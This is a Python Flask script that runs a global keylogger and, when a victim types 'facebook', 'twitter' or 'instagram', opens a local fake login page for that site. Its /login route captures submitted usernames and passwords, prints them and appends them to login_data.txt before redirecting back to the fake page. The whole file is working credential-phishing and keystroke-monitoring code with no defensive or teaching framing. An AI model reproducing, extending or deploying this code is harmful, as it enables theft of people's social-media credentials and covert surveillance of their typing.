from flask import Flask, redirect, url_for, render_template, request
from pynput.keyboard import Key, Listener
import webbrowser
import threading


app = Flask(__name__)

app.config['DEBUG'] = True


current_keys = []
trigger_words = {
    'facebook': 'http://127.0.0.1:5000/facebook',
    'twitter': 'http://127.0.0.1:5000/twitter',
    'instagram': 'http://127.0.0.1:5000/instagram'
}
page_opened_recently = False  # Flag to control page opening

def on_press(key):
    global page_opened_recently
    try:
        if key.char:
            current_keys.append(key.char)
    except AttributeError:
        pass

    typed_string = ''.join(filter(None, current_keys)).lower()

    if not page_opened_recently:  # Check if the flag is False
        for word, url in trigger_words.items():
            if word in typed_string:
                webbrowser.open(url)
                current_keys.clear()
                page_opened_recently = True  # Set the flag to True
                break

def on_release(key):
    global page_opened_recently
    if key == Key.esc:
        return False  # Stop listening if the escape key is pressed
    page_opened_recently = False  # Reset the flag on key release

def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

@app.route('/')
def home():
    return redirect(url_for('fake_facebook'))

@app.route('/facebook')
def fake_facebook():
    return render_template('facebook.html')

@app.route('/twitter')
def fake_twitter():
    return render_template('twitter.html')

@app.route('/instagram')
def fake_instagram():
    return render_template('instagram.html')

@app.route('/login', methods=['POST'])
def login():
    # Vérifiez que tous les champs nécessaires sont présents
    if 'username' in request.form and 'password' in request.form and 'origin' in request.form:
        username = request.form['username']
        password = request.form['password']
        origin = request.form['origin']

        print(f"Received username: {username} and password: {password} from {origin}")
        with open('login_data.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}, Origin: {origin}\n')

        # Redirection basée sur l'origine
        if origin == 'facebook':
            return redirect(url_for('fake_facebook'))
        elif origin == 'twitter':
            return redirect(url_for('fake_twitter'))
        elif origin == 'instagram':
            return redirect(url_for('fake_instagram'))
        else:
            return redirect(url_for('home'))  # Fallback si l'origine n'est pas connue
    else:
        return "Missing data", 400

if __name__ == "__main__":

    threading.Thread(target=start_listener).start()
    app.run()




